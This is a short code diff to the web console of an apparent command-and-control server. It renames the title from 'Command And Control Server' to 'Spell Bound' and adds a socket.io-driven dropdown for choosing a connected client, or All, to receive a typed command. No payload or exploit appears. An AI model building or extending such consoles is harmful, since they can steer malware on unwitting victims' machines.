@@ -95,9 +95,18 @@
         socket.on("connect", function () {
           socket.emit("my_event", { data: "Connected" });
         });
-
+        i = 0
         socket.on("connected_clients", function(msg, cb){
+          
           clients=msg.data
+          var select = document.getElementById("client");
+          var opt = clients.at(-1);
+          opt += i;
+          i += 1;
+          var el = document.createElement("option");
+          el.textContent = opt;
+          el.value = opt;
+          select.appendChild(el);
         });
 
         socket.on('printer', function(msg, cb){
@@ -145,9 +154,10 @@
         font-size: 45px;
         text-align: center;
         font-weight: bolder;
+        
       "
     >
-      Command And Control Server
+      Spell Bound
     </p>
     <div
       id="main"
@@ -167,7 +177,17 @@
       </form> 
         <form id="commands" method="POST">
           <input type="text" id="message" placeholder="Command/ Instrucion" required />
-          <input type="text" id="client" placeholder="Client No" required />
+          <select id = "client" style="
+          background-color: transparent;
+          font-size: 20px;
+          border-color: green;
+          color: grey;
+          border-radius: 8px;
+          text-indent: 10px;
+          ">
+          <option>Client</option>
+          <option value="All">All</option>
+        </select>
           <button type="submit">Send</button>
           </form>
     </div>
